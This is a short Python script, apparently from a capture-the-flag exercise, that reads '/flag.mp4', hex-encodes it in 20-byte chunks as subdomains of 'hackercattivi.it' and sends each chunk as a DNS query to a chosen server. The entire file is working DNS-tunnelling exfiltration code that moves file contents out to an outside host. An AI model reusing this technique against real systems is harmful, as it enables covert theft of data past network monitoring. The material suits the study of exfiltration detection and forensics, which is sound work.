import sys
import time
import socket
import binascii
import dns.resolver
import dns.query
import dns.message

BLOCK_SIZE = 20

def resolve(service: str):
    try:
        ip = socket.gethostbyname(service)
        return ip
    except socket.gaierror as e:
        print("error resolving service name")
        exit()

def main(addr: tuple[str, int]):
    video = open('/flag.mp4', 'rb').read()
    blocks = [ video[i:i+BLOCK_SIZE] for i in range(0, len(video), BLOCK_SIZE) ]

    for i, block in enumerate(blocks):
        domain = binascii.hexlify(block) + b'.hackercattivi.it'
        query = dns.message.make_query(domain.decode(), dns.rdatatype.A)
        response = dns.query.udp(query, resolve(addr[0]), port=addr[1])
        print(response)
        if i % 100 == 0:
            print(f'sent block {i}/{len(blocks)}')
    
    print('sent all blocks')
    time.sleep(5)

if __name__ == '__main__':
    time.sleep(3)
    main((sys.argv[1], int(sys.argv[2])))
